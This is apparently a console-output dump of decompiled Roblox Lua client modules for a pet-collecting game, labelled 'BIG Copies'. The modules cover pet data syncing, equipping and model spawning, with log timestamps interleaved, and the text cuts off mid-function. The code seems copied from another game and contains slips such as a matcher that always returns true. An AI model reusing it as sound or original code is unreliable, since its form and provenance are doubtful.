                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.RAPCmds
	===========
		
	===========
	
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local _ = game:GetService("Players");
local Library = ReplicatedStorage:WaitForChild("Library");
local Modules = Library:WaitForChild("Modules");
local Client = Library:WaitForChild("Client");
local m_RAPShared = require(Library.RAPShared);
local _ = require(Library.Functions);
local _ = require(Library.Signal);
local _ = require(Modules.Pets);
local m_Network = require(Client.Network);
local _ = require(Client.FFlags);
local _ = require(Client.Save);
local table1 = {};
local table2 = {};

function table1.Get(p1)
	local t = m_RAPShared.CreateKey(p1).encoded
	local v1 = table2[t];
	--print(t,table2)
	--print(v1,table2)
	if v1 then
		return v1.val;
	end
	return nil;
end

function table1.SumAll(p2) 
	local v2 = 0;
	for _, val1 in ipairs(p2) do
		local v4 = table1.Get(val1);
		if not v4 then continue end
		v2 = v2 + v4;
	end
	return math.round(v2);
end

function merge(p3) 
	for key2, val2 in pairs(p3) do
		table2[key2] = val2;
	end
end

m_Network.Fired("RAP: Update"):Connect(merge);

task.spawn(function() 
	local v3 = m_Network.Invoke("RAP: Get");
	if v3 then
		merge(v3);
	end
end);

return table1;
  -  Editar
  04:54:13.762    -  Editar
  04:54:13.762  ----- [2317] ReplicatedStorage.Library.Client.Network -----  -  Editar
  04:54:13.762  -- | load library | --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")
local ClientLibrary = Library:WaitForChild("Client")
local Modules = Library:WaitForChild("Modules")
local Types = Library:WaitForChild("Types")

-- | shared modules | --
local Network = require(Library.Network)

-----------------------------------------------------------------------------------------------------

return Network  -  Editar
  04:54:13.762    -  Editar
  04:54:13.762  ----- [2318] ReplicatedStorage.Library.Client.PetCmds -----  -  Editar
  04:54:13.763  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.Pets
	===========
	TODO: Rescript the reset of this.
	===========

	===========
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-- | load library | --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")
local ClientLibrary = Library:WaitForChild("Client")
local Modules = Library:WaitForChild("Modules")
local Types = Library:WaitForChild("Types")

-- | shared modules | --
local Shared = require(Library.Shared)
local Signal = require(Library.Signal)
local Directory = require(Library.Directory)
local Functions = require(Library.Functions)
local Variables = require(Library.Variables)
local Audio = require(Library.Audio)
local Save = require(ClientLibrary.Save)
local Network = require(ClientLibrary.Network)
local GUIFX = require(ClientLibrary.GUIFX)
local WorldCmds = require(ClientLibrary.WorldCmds)
local Pets = require(Modules.Pets)
local DefaultStats = require(Modules.DefaultStats)

--------|       Top       |--------
local PetCmds = {}

--------|     Setting     |--------
local WalkSounds = { 6840608566, 6840608533, 6840608598, 6840608504 }

--------|    Reference    |--------
local Assets = ReplicatedStorage:WaitForChild("Assets")
local X = ReplicatedStorage:WaitForChild("X")
local Players = game:GetService("Players")
local debris = workspace:WaitForChild("__DEBRIS")


--------|    Variables    |--------
local LeftistHeap = require(X:WaitForChild("Util").LeftistHeap)
local rng = Random.new()
local Indices = {}
local Pets = {}


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local u1 = {}
function PetCmds.GetIndices(p1, p2) -- Line: 48
	--[[
		Upvalues:
			[1] = table3
			[2] = table4
	--]]
	local v1 = u1[p1]
	if v1 then
		return v1
	end
	local table5 = {}
	for key1, val1 in ipairs(p2.Pets) do
		table5[val1.uid] = key1
		if Pets[val1.uid] then continue end
		Pets[val1.uid] = p1
	end
	Indices[p1] = table5
	return table5
end
function PetCmds.DeleteIndices(p3) -- Line: 64
	--[[
		Upvalues:
			[1] = table3
	--]]
	if Indices[p3] then
		Indices[p3] = nil;
	end
end
function PetCmds.GetIndex(p4, p5, p6) -- Line: 70
	--[[
		Upvalues:
			[1] = PetCmds
	--]]
	return PetCmds.GetIndices(p4, p5)[p6]
end
function PetCmds.GetFrom(p7, p8, p9) 
	local Index = PetCmds.GetIndex(p7, p8, p9);
	if not Index then
		return nil, 0;
	end
	assert(Index);
	local v2 = p8.Pets[Index];
	if not v2 then
		return nil, 0;
	end
	assert(v2);
	if p9 ~= v2.uid then
		warn("Pet mismatch:", p9, Index, v2 and v2.uid or "nil");
		return nil, 0;
	end
	return v2, Index;
end

function PetCmds.Get(uid) 
	debug.profilebegin("PetCmds.Get");
	local v3 = Pets[uid];
	if v3 then
		local v36 = Save.Get(v3);
		if v36 then
			local v56, v57 = PetCmds.GetFrom(v3, v36, uid);
			if v56 then
				debug.profileend();
				return v56, v3, v57;
			end
		end
		Pets[uid] = nil;
	end
	for key2, val2 in pairs(Save.GetSaves()) do
		local v37, v38 = PetCmds.GetFrom(key2, val2, uid);
		if not v37 then continue end
		Pets[uid] = key2;
		debug.profileend();
		return v37, key2, v38;
	end
	debug.profileend();
	return nil, nil, 0;
end

Signal.Fired("Stats Removed"):Connect(function(player) 
	PetCmds.DeleteIndices(player)
	for index, _player in pairs(Pets) do
		if _player == player then
			Pets[index] = nil
		end	
	end
end)

function PetCmds.GetEquipped(p12, p13, p14)
	local v35;
	if p12 == nil then
		v35 = Players.LocalPlayer;
	else
		assert(typeof(p12) == "Instance" and p12:IsA("Player") or false);
		v35 = p12;
	end
	debug.profilebegin("PetCmds.GetEquipped");
	local table6 = {};
	local v4 = Save.Get(v35, true);
	if v4 then
		local v39 = Shared.IsHardcore and v4.HardcorePetsEquipped or v4.PetsEquipped;
		if p14 then
			if p13 then
				for key25, val25 in pairs(v39) do
					if not val25 then continue end
					table6[key25] = true;
				end
			else
				for key26, val26 in pairs(v39) do
					if not val26 then continue end
					local From2 = PetCmds.GetFrom(v35, v4, key26);
					if not From2 then continue end
					table6[key26] = From2;
				end
			end
		elseif p13 then
			for key27, val27 in pairs(v39) do
				if not val27 then continue end
				table.insert(table6, key27);
			end
		else
			for key28, val28 in pairs(v39) do
				if not val28 then continue end
				local From = PetCmds.GetFrom(v35, v4, key28);
				if not From then continue end
				table.insert(table6, From);
			end
		end
	end
	debug.profileend();
	return table6;
end
function PetCmds.LocalEquipPet(player, uid, equip)  
	local save = Save.Get(player)
	if save then
		local changed = false
		local pets = Shared.IsHardcore and save.HardcorePetsEquipped or save.PetsEquipped
		if equip then
			if not pets[uid] then
				pets[uid] = true
				changed = true
			end
		elseif pets[uid] then
			pets[uid] = nil
			changed = true
		end
		if changed then
			if player == Players.LocalPlayer then
				Signal.Fire("Pet Equips Changed")
				return
			end
			Signal.Fire("Other Pet Equips Changed", player)
		end
	end
end

Network.Fired("Pet Added"):Connect(function(player, pdata) 
	local save = Save.Get(player)
	if not save then
		return
	end
	assert(save)
	local PetIndices = PetCmds.GetIndices(player, save)
	table.insert(save.Pets, pdata)
	local petindice = #save.Pets
	PetIndices[pdata.uid] = petindice
	local islocalplayer = player == Players.LocalPlayer
	if islocalplayer then
		Signal.Fire("Stat Changed", "Pets")
	else
		Signal.Fire("Other Stat Changed", player, "Pets")
	end
	if islocalplayer then
		Signal.Fire("Stats Changed")
		return
	end
	Signal.Fire("Other Stats Changed", player)
end)


Network.Fired("Pet Removed"):Connect(function(player, uid) 
	local save = Save.Get(player)
	if not save then
		return 
	end
	assert(save)
	local playerPets = PetCmds.GetIndices(player, save)
	local pet = playerPets[uid]
	if not pet then
		return
	end
	assert(pet)
	local _pet = save.Pets[pet]
	if not _pet then
		return
	end
	assert(_pet)
	if uid ~= _pet.uid then 
		return
	end
	table.remove(save.Pets, pet)
	playerPets[uid] = nil
	for index = pet, #save.Pets do
		local __pet = save.Pets[index]
		if __pet then
			playerPets[__pet.uid] = index
		end
	end
	local IsLocalPlayer = player == Players.LocalPlayer
	if IsLocalPlayer then
		Signal.Fire("Stat Changed", "Pets")
	else
		Signal.Fire("Other Stat Changed", player, "Pets")
	end
	if IsLocalPlayer then
		Signal.Fire("Stats Changed")
	else
		Signal.Fire("Other Stats Changed", player)
	end
	PetCmds.LocalEquipPet(player, uid, false)
end)

Network.Fired("Pet Update"):Connect(function(player, pdata) 
	local save = Save.Get(player)
	if not save then
		return 
	end
	assert(save)
	local petindex = PetCmds.GetIndex(player, save, pdata.uid)
	if not petindex then
		return 
	end
	assert(petindex)
	local opdata = save.Pets[petindex]
	if not opdata then 
		return 
	end
	assert(opdata)
	if pdata.uid ~= opdata.uid then
		return
	end
	if Functions.DeepEqualsUnsafe(opdata, pdata) then
		return 
	end
	save.Pets[petindex] = pdata
	
	local islocalplayer = player == Players.LocalPlayer
	if islocalplayer then
		Signal.Fire("Stat Changed", "Pets")
	else
		Signal.Fire("Other Stat Changed", player, "Pets")
	end
	
	if islocalplayer then
		Signal.Fire("Stats Changed")
		return
	end
	
	Signal.Fire("Other Stats Changed", player)
end)

Network.Fired("Pet Equip Changed"):Connect(function(player, uid, equip)
	PetCmds.LocalEquipPet(player, uid, equip)
end)

function IsGameWorld(plr)
	local v32 = Save.Get(plr)
	if not v32 then
		return false
	end
	local world = Shared.IsHardcore and v32.Hardcore.World or v32.World  
	if world ~= "Yeet" then
		return false
	end
	return true
end

function PetCmds.HasBestEquipped(player)
	assert(player == nil and true or typeof(player) == "Instance" and player:IsA("Player") or false)
	debug.profilebegin("PetCmds.HasBestEquipped")
	local save = Save.Get(player)
	if not save then
		debug.profileend()
		return false
	end
	assert(save)
	local playerEquipped = PetCmds.GetEquipped(player, true, true)
	local maxeqipslots = save.InfPetsEnabled and #save.Pets or Shared.GetMaxEquippedSlots(save)
	local yeetPower
	if IsGameWorld(player) then
		yeetPower = function(pet)
			return Shared.GetYeetPower(pet, save.Pets)
		end
	end
	local petOrder = function(i, v)
		return Shared.PetOrderBest(i, v, nil, nil, nil, nil, yeetPower)
	end
	local n = LeftistHeap.new(petOrder)
	for _, pet in ipairs(save.Pets) do
		if Directory.Pets[pet.id].isGift then
			continue 
		end
		n.insert(pet)
	end
	local hasbestequipped = true
	for index = 1, maxeqipslots do
		local v, pet = n.tryPop()
		if not v then 
			break 
		end
		if not playerEquipped[pet.uid] then
			hasbestequipped = false
			break
		end
	end
	debug.profileend()
	return hasbestequipped
end

function PetCmds.Match(pet, a) 
	assert(typeof(pet) == "table")
	if #a == 0 then
		return true
	end
	
	local dir = Directory.Pets[pet.id]
	if not dir then
		return false
	end
	local _match = {}
	if dir.rarity then
		table.insert(_match, dir.rarity)
	end
	if pet.sh then
		table.insert(_match, "Shiny")
	end
	if dir.name then
		table.insert(_match, dir.name)
	end
	if pet.nk then
		table.insert(_match, pet.nk)
	end
	
	return true
end

function PetCmds.Scaler(pet)  
	local scaler = pet.scaler
	if not scaler then
		scaler = Functions.Scaler()
		pet.scaler = scaler
	end
	assert(scaler)
	return scaler
end

function PetCmds.Spawn(p110, p111, p112, p113)
	debug.profilebegin("PetCmds.Spawn")
	assert(p110)
	assert(p111)
	local v114 = WorldCmds.Get()
	assert(v114)
	local v115 = Directory.Pets[p110.id]
	assert(v115)
	local v116 = p110.g == true
	local v117 = p110.r == true
	local v118 = p110.dm == true
	local v119 = p110.hc == true
	local v120 = p110.sh == true
	local model = (v116 and v115.modelGold or v115.model) 
	if not model then
		local parent = v115._script.Parent
		if parent then
			model = parent:WaitForChild(v116 and "Golden" or "Pet")
		end
	end
	local Directory1 = model:Clone()
	if v115.replacements and p110.rep then
		for _, v122 in ipairs(p110.rep) do
			local v123 = v115.replacements[v122]
			if v123 then
				local v124 = v123.dst:Clone()
				local v125 = v123.src
				local v126
				if v125 then
					local v127 = Directory1:FindFirstChild(v125.Name)
					if v127 then
						v126 = v127.Parent or Directory1
						if v127:IsA("PVInstance") and v124:IsA("PVInstance") then
							v124:PivotTo(v127:GetPivot())
						end
						v127:Destroy()
					else
						v126 = Directory1
					end
				else
					v126 = Directory1
				end
				v124.Parent = v126
			end
		end
	end
	local v128 = { Directory1 }
	local v129 = {}
	for _, v130 in ipairs(Directory1:GetDescendants()) do
		if v130:IsA("BasePart") then
			table.insert(v128, v130)
			table.insert(v129, v130)
		end
	end
	local v131 = Directory1:FindFirstChildOfClass("SpecialMesh")
	local v132 = {}
	if v131 then
		v132[1] = v131
	end
	if v131 then
		local scale = v131.Scale
		if not scale then
			scale = Vector3.one
		end
		for _, v133 in ipairs(v128) do
			local v134 = v133:FindFirstChildOfClass("SpecialMesh")
			if v134 then
				if  v134 ~= v131 then
					table.insert(v132, v134)
				end
				local size = v134:GetAttribute("OriginalSize")
				if size then
					v133.Size = (size) * scale
				end
			end	
		end
	end	
	local v135 = Directory1:WaitForChild("center")
	local v136 = Directory1:WaitForChild("bottom")
	local v137 = Directory1:FindFirstChild("mount", true)
	local v138 = Directory1:FindFirstChild("mount_character") or v137
	Directory1:SetAttribute("Owner", p111.Name)
	Directory1:SetAttribute("Dir", p110.id)
	Directory1:SetAttribute("ID", p110.uid)
	Directory1.Name = p110.uid
	Directory1.Anchored = true
	for _, v140 in ipairs(v128) do
		v140.Massless = true
		v140.CanCollide = false
		v140.CanQuery = true
		v140.CanTouch = true
		v140.CastShadow = false
		if v140.Material == Enum.Material.SmoothPlastic then
			v140.Material = Enum.Material.Plastic
			v140.MaterialVariant = ""
			if v115.balloon or p110.sh then
				v140.Material = Enum.Material.Metal
				v140.MaterialVariant = "MetalFineGold"
			end
			if v115.evolved then
				v140.Material = Enum.Material.SmoothPlastic
				v140.MaterialVariant = ""
			end
		end
		if v115.weld then
			v140.Anchored = true
		end
	end
	local v141 = p113 or Vector3.one
	local v142 = Vector3.one
	if #v132 > 0 then
		local part = v132[1]
		v142 = part.Offset
	else
		if v131 then 
			v142 = v131.Offset
		end
	end
	local v143 = v135.CFrame
	local v144 = CFrame.new(v142.X, v143.Y, v143.Z) * CFrame.fromOrientation(0, 1.5707963267948966, 0)
	v135.CFrame = v144
	local v145 = v136.CFrame
	local v146
	local part = v128[1]
	if #v132 > 0 then
		--part = v132[1]
		--local v614 = CFrame.new(v142.X, v136.CFrame.Y, v136.CFrame.Z)
		--v614 = (v614) * CFrame.fromOrientation(0, 1.5707963267949, 0)
		--v136.CFrame = v614
		local originalSize = part:GetAttribute("OriginalSize")
		if not originalSize then
			part = v132[1]
		end
	end
	if part:IsA("MeshPart") then
		v146 = CFrame.new(v144.X, (-model.Size.Y) / 2 + v142.Y, v144.Z)
	else
		v146 = CFrame.new(v144.X, v145.Y, v144.Z)
	end
	if not v115.parralax then
		v136.CFrame = v146 * CFrame.fromOrientation(0, 1.5707963267949, 0)
	end	
	for _, v147 in ipairs(v132) do
		if v147.VertexColor == Vector3.one then
			v147.VertexColor = Vector3.new(1.125, 1.125, 1.125)
		end
	end
	if v116 then
		for _, v148 in ipairs(v132) do
			v148.VertexColor = Vector3.new(1.45, 1.45, 1.45)
		end
		for _, v149 in ipairs(Assets.Particles:WaitForChild("Golden Pet"):GetChildren()) do
			v149:Clone().Parent = Directory1
		end
	end
	local v658 = {}

	if v115.parralax then
		for _, v663 in ipairs(v115.parralax) do
			local v666 = v663.CameraDirection or Vector3.new(0, 0, 0)
			local v667 = v663.AnimSpeed or Vector3.new(0, 0, 0)
			local v669 = v663.NoiseCameraRatio or 0
			local v671 = v663.BrightnessNoiseRange or { Vector3.new(0, 0, 0), Vector3.new(0, 0, 0) }
			local LinearSpeed = v663.LinearSpeed or Vector3.new(0.75, 0.75, 1)
			local v678 = v663.LogScale or 0.5

			v663.Color = v663.Color or Color3.new(1, 1, 1)
			local v688 = Vector3.new(v663.Color.R, v663.Color.G, v663.Color.B)
			v663.Brightness = v663.Brightness or Vector3.new(1, 1, 1)
			local v689 = Vector3.new(v663.Brightness.X, v663.Brightness.Y, v663.Brightness.Z)
			local v690 = v688 * v689

			local v697 = v663.Transparency or 0

			v663.FixedOffset = v663.FixedOffset or Vector3.new(math.random() * 2 - 1, math.random() * 2 - 1, 1)
			v663.FixedScale = v663.FixedScale or Vector3.new(2, 2, 1)

			for _, v716 in ipairs(v128) do
				if v716:GetAttribute("ApplyParralax") ~= false and not v116 then
					if not v658[v716] then
						v658[v716] = {}
					end
					for _, v726 in ipairs(Enum.NormalId:GetEnumItems()) do
						local v728 = Functions.FaceSize(v726, v716.Size)
						local v732 = Vector3.new(0, 0, 0) + v663.FixedOffset * v728
						local v1026 = v728 * v663.FixedScale

						local v736 = Instance.new("Texture")
						v736.Name = "Tex" .. v726.Name
						v736.Face = v726
						v736.Color3 = Color3.new(v690.X, v690.Y, v690.Z)
						v736.Transparency = v697
						v736.ZIndex = v663.ZIndex or 1
						v736.Texture = v663.TextureId or ""
						v736.OffsetStudsU = v732.X
						v736.OffsetStudsV = v732.Y
						v736.StudsPerTileU = v1026.X
						v736.StudsPerTileV = v1026.Y
						v736.Parent = v716

						table.insert(v658[v716], {
							instance = v736,
							transparency = v697,
							brightness = v689,
							color = v688,
							face = v726,
							faceNormal = Vector3.FromNormalId(v726),
							fixedOffset = v663.FixedOffset,
							fixedScale = v663.FixedScale,
							linearSpeed = LinearSpeed,
							logScale = v678,
							nearPlaneZ = v663.NearPlaneZ or 15,
							cameraDirection = v666,
							animSpeed = v667,
							animPos = Vector3.new(0, 0, 0),
							tickColor = Vector3.new(1, 1, 1),
							noiseCameraRatio = v669,
							brightnessNoiseRange = v671,
							transparencyNoiseRange = v663.TransparencyNoiseRange,
							onexCameraFix = v115.titanic and 6 or v115.huge and 2 or 0.75
						})
					end
				end
			end
		end
	end

	local v150 = {}
	local v151 = {}
	if v117 then
		local v152 = Assets.Particles:WaitForChild("Rainbow Pet"):WaitForChild("Sparkles"):Clone()
		v152.Name = "__RAINBOWPARTICLES"
		v152.Parent = Directory1
		table.insert(v151, v152)
		for _, v153 in ipairs(v128) do
			local v154 = Assets.Other:WaitForChild("Rainbow Pet"):WaitForChild("Decal"):Clone()
			v154.Name = "__RAINBOWFX"
			v154.Parent = v153
			table.insert(v150, v154)
		end
		for _, v155 in ipairs(v132) do
			v155.VertexColor = Vector3.new(2, 2, 2)
		end
	end
	if v118 then
		for _, v156 in ipairs(v132) do
			if v119 then
				v156.VertexColor = Vector3.new(0.8, 20, 20)
			else
				v156.VertexColor = Vector3.new(20, 0.6, 20)
			end
		end
	end
	local v157 = v115.colorVariants and p110.cv and v115.colorVariants[p110.cv]
	if v157 then
		local v158 = v157.Color
		local v159 = Functions.Map3(Vector3.new(v158.R, v158.G, v158.B) * v157.Magnitude, Vector3.zero, Vector3.one, Vector3.new(0.1, 0.1, 0.1), Vector3.one)
		for _, v160 in ipairs(v132) do
			v160.VertexColor = v159
		end
		local Save1 = {
			{
				["a"] = Color3.new(1, 1, 1), 
				["b"] = v158
			}
		}
		local function v165(p162)
			-- upvalues: (ref) Functions, (copy) Save1
			local v163 = {}
			for _, v164 in ipairs(p162.Keypoints) do
				table.insert(v163, ColorSequenceKeypoint.new(v164.Time, (Functions.Recolor(v164.Value, Save1))))
			end
			return ColorSequence.new(v163)
		end
		for _, v166 in ipairs(Directory1:GetDescendants()) do
			if v166:IsA("ParticleEmitter") then
				v166.Color = v165(v166.Color)
			elseif v166:IsA("Trail") then
				v166.Color = v165(v166.Color)
			elseif v166:IsA("Light") then
				v166.Color = Functions.Recolor(v166.Color, Save1)
			end
		end
	end
	local v167 = nil
	if p110.vc then
		v167 = Vector3.new(table.unpack(p110.vc))
	elseif v115.vertexColor then
		v167 = v115.vertexColor
	end
	if v167 then
		local Save8 = Color3.new(v167.X, v167.Y, v167.Z)
		for _, v169 in ipairs(v132) do
			v169.VertexColor = v167
		end
		local function v174(p170)
			-- upvalues: (copy) Save8, (ref) Functions
			local v171 = {
				{
					["a"] = Color3.new(1, 1, 1), 
					["b"] = Save8
				}
			}
			local v172 = {}
			for _, v173 in ipairs(p170.Keypoints) do
				table.insert(v172, ColorSequenceKeypoint.new(v173.Time, (Functions.Recolor(v173.Value, v171))))
			end
			return ColorSequence.new(v172)
		end
		for _, v175 in ipairs(Directory1:GetDescendants()) do
			if v175:IsA("ParticleEmitter") then
				v175.Color = v174(v175.Color)
			elseif v175:IsA("Trail") then
				v175.Color = v174(v175.Color)
			end
		end
	end
	local v176 = {}
	if v119 then
		for _, v177 in ipairs((Assets.Particles["Hardcore Pets"]:GetChildren())) do
			v177:Clone().Parent = v135
		end
		if not (v117 or v118) then
			for _, _ in ipairs(v128) do
				local v178 = Assets.Other:WaitForChild("Hardcore Pet"):WaitForChild("Decal"):Clone()
				v178.Name = "__HARDCOREFX"
				v178.Parent = Directory1
				table.insert(v176, v178)
			end
		end
		v141 = v141 * 1.25
	end
	if p110.id == "294" then
		v141 = v141 * (0.2 + 1.3 * math.random())
	end
	if v120 then
		local v_u_179
		if v115.titanic then
			v_u_179 = Assets.Particles.Shiny:WaitForChild("TitanicShinyParticle"):Clone()
			Functions.Scaler()(v_u_179, 3.25)
		elseif v115.huge then
			v_u_179 = Assets.Particles.Shiny:WaitForChild("HugeShinyParticle"):Clone()
			Functions.Scaler()(v_u_179, 1.5)
		else
			v_u_179 = Assets.Particles.Shiny:WaitForChild("ShinyParticle"):Clone()
		end
		v_u_179.Parent = v135
		task.defer(function()
			-- upvalues: (ref) v_u_179
			v_u_179:Emit(1)
		end)
	end
	local v180 = string.find(v115.name, "Pixel") ~= nil and "Pixel" or nil
	local v181 = nil
	local v182
	if p112 then
		v182 = nil
	else
		v182 = Assets.Billboards.Pet:Clone()
		v182.Name = "__BILLBOARD"
		v182.Nickname.AutoLocalize = false
		v182.Nickname.Text = p110.nk or ""
		v182.StudsOffset = Vector3.new(0, (v135.Position - v136.Position).Y * 2, 0)
		if p110.snk then
			v181 = GUIFX.Rainbow(v182.Nickname, "TextColor3", 3)
		end
		if 2 <= Shared.PetRarityNumbers[v115.rarity] then
			local v183 = v182.Rarity
			v183.Text = v115.rarity
			Shared.ApplyRarityColor(v183, v115.rarity)
			v183.Visible = true
			v182.StudsOffset = v182.StudsOffset + Vector3.new(0, 1, 0)
		end
		v182.Parent = Directory1
	end
	local v184 = {}
	if v115.weld then
		for _, v185 in ipairs(v129) do
			local v186 = v185:FindFirstAncestorWhichIsA("Model")
			local v187
			if v186 then
				v187 = v186.PrimaryPart
			else
				v187 = nil
			end
			local v188 = v187 or v185:FindFirstAncestorWhichIsA("BasePart") or v185.AssemblyRootPart or Directory1
			assert(v188)
			local v189 = v188:GetPivot():ToObjectSpace(v185:GetPivot())
			local v190 = v185:GetAttribute("RotationRate")
			if v190 then
				v190 = v190 * math.pi / 180
			end
			v184[v185] = {
				["part"] = v185, 
				["root"] = v188, 
				["offset"] = v189, 
				["lastOffset"] = v189, 
				["scaling"] = not v188:GetAttribute("NoScale"), 
				["rotationRate"] = v190
			}
		end
	end
	task.defer(function()
		-- upvalues: (ref) Audio, (copy) Directory1, (ref) rng, (ref) Functions, (ref) Assets
		Audio.Play("rbxassetid://7000720081", Directory1, rng:NextNumber(0.95, 1.05), 0.125, 125)
		local v191, v192 = Functions.Emit(Directory1, nil, Assets.Particles:WaitForChild("Pet Spawn"))
		for _, v193 in ipairs(v191) do
			Functions.AddDebris(v193, v192)
		end
	end)
	local v194 = Vector3.one
	local v195 = Vector3.one * v141
	local v196
	if v194 == v195 then
